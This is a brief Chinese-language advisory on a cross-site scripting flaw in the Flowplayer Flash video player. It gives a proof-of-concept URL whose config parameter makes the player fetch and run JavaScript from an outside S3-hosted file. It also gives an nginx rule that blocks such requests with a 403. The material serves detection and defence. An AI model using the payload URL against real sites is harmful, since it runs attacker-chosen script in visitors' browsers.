# flowplayer视频播发器XSS跨站漏洞

http://example.com/static/flowplayer/v3.2.6/flowplayer-3.2.7.swf?config=https://s3-us-west-2.amazonaws.com/bxss/fp.js

在火狐浏览器上输入上面安全隐患位置的URL， alert弹出ExternalInterfaceXSSImURL1，则表示存在该漏洞。

由于该漏洞是flash会远程执行url上带有config所指定网站的js，所以需要用正则判断，url中如果通过带有flowplayer和config，则表示非法的URL请求，返回403即可。正则如下：

```shell

location /static {
    if ($request_uri ~* flowplayer(.*)config=) {
        return 403;
    }
    .......
}

```